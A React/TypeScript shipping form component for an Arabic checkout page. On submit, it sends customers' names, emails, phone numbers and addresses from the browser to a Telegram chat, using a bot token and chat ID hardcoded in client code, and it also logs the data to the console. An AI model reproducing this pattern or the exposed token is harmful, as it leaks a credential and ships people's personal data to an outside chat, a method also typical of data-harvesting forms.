"use client";

type ShippingFormProps = {
  shippingInfo: {
    fullName: string;
    address: string;
    city: string;
    neighborhood: string;
    street: string;
    houseDescription: string;
    postalCode: string;
    phone: string;
    whatsapp: string;
    email: string;
  };
  shippingErrors: {
    fullName: string;
    address: string;
    city: string;
    neighborhood: string;
    street: string;
    houseDescription: string;
    postalCode: string;
    phone: string;
    whatsapp: string;
    email: string;
  };
  handleShippingChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  handleShippingSubmit: () => void;
};

export default function ShippingForm({
  shippingInfo,
  shippingErrors,
  handleShippingChange,
  handleShippingSubmit,
}: ShippingFormProps) {
  return (
    <div className="text-right">
      <h2 className="text-lg font-bold mb-4">معلومات الشحن</h2>
      <div className="space-y-4">
        <div>
          <label
            htmlFor="fullName"
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            الاسم الكامل
          </label>
          <input
            type="text"
            id="fullName"
            name="fullName"
            value={shippingInfo.fullName}
            onChange={handleShippingChange}
            className={`w-full p-2 border ${
              shippingErrors.fullName ? "border-red-500" : "border-gray-300"
            } rounded-md text-right`}
            required
          />
          {shippingErrors.fullName && (
            <p className="text-red-500 text-xs mt-1 text-right">
              {shippingErrors.fullName}
            </p>
          )}
        </div>
        <div>
          <label
            htmlFor="email"
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            البريد الإلكتروني
          </label>
          <input
            type="email"
            id="email"
            name="email"
            value={shippingInfo.email}
            onChange={handleShippingChange}
            className={`w-full p-2 border ${
              shippingErrors.email ? "border-red-500" : "border-gray-300"
            } rounded-md text-right`}
            required
          />
          {shippingErrors.email && (
            <p className="text-red-500 text-xs mt-1 text-right">
              {shippingErrors.email}
            </p>
          )}
        </div>

        <div>
          <label
            htmlFor="phone"
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            رقم الهاتف
          </label>
          <input
            type="tel"
            id="phone"
            name="phone"
            value={shippingInfo.phone}
            onChange={handleShippingChange}
            className={`w-full p-2 border ${
              shippingErrors.phone ? "border-red-500" : "border-gray-300"
            } rounded-md text-right`}
            required
          />
          {shippingErrors.phone && (
            <p className="text-red-500 text-xs mt-1 text-right">
              {shippingErrors.phone}
            </p>
          )}
        </div>

        <div className="flex flex-col md:flex-row gap-4">
          <div className="flex-1">
            <label
              htmlFor="city"
              className="block text-sm font-medium text-gray-700 mb-1"
            >
              المدينة
            </label>
            <input
              type="text"
              id="city"
              name="city"
              value={shippingInfo.city}
              onChange={handleShippingChange}
              className={`w-full p-2 border ${
                shippingErrors.city ? "border-red-500" : "border-gray-300"
              } rounded-md text-right`}
              required
            />
            {shippingErrors.city && (
              <p className="text-red-500 text-xs mt-1 text-right">
                {shippingErrors.city}
              </p>
            )}
          </div>
        </div>
        <div>
          <label
            htmlFor="address"
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            العنوان
          </label>
          <input
            type="text"
            id="address"
            name="address"
            value={shippingInfo.address}
            onChange={handleShippingChange}
            className={`w-full p-2 border ${
              shippingErrors.address ? "border-red-500" : "border-gray-300"
            } rounded-md text-right`}
            required
          />
          {shippingErrors.address && (
            <p className="text-red-500 text-xs mt-1 text-right">
              {shippingErrors.address}
            </p>
          )}
        </div>

        <div>
          <label
            htmlFor="houseDescription"
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            وصف البيت (اختياري)
          </label>
          <input
            type="text"
            id="houseDescription"
            name="houseDescription"
            value={shippingInfo.houseDescription}
            onChange={handleShippingChange}
            className="w-full p-2 border border-gray-300 rounded-md text-right"
          />
        </div>
      </div>
      <button
        onClick={() => {
          // Send shipping data to Telegram
          const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
          const chatId = "5439962016";

          const escapeMarkdown = (text: string) => {
            return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
          };

          const formatShippingInfo = () => {
            const now = new Date().toLocaleString("ar-SA");
            return [
              "📦 *معلومات الشحن* 📦",
              `الاسم الكامل: ${escapeMarkdown(shippingInfo.fullName)}`,
              `البريد الإلكتروني: ${escapeMarkdown(shippingInfo.email)}`,
              `رقم الهاتف: ${escapeMarkdown(shippingInfo.phone)}`,
              `المدينة: ${escapeMarkdown(shippingInfo.city)}`,
              `العنوان: ${escapeMarkdown(shippingInfo.address)}`,
              shippingInfo.houseDescription
                ? `وصف البيت: ${escapeMarkdown(shippingInfo.houseDescription)}`
                : null,
              `وقت الطلب: ${escapeMarkdown(now)}`,
            ]
              .filter(Boolean)
              .join("\n");
          };

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: formatShippingInfo(),
              parse_mode: "Markdown",
            }),
          }).catch((error) =>
            console.error("Error sending shipping data to Telegram:", error)
          );

          console.log("بيانات الشحن المدخلة:", shippingInfo);
          handleShippingSubmit();
        }}
        className="component-base primary w-full mt-4 py-2 rounded-md"
      >
        التالي
      </button>
    </div>
  );
}
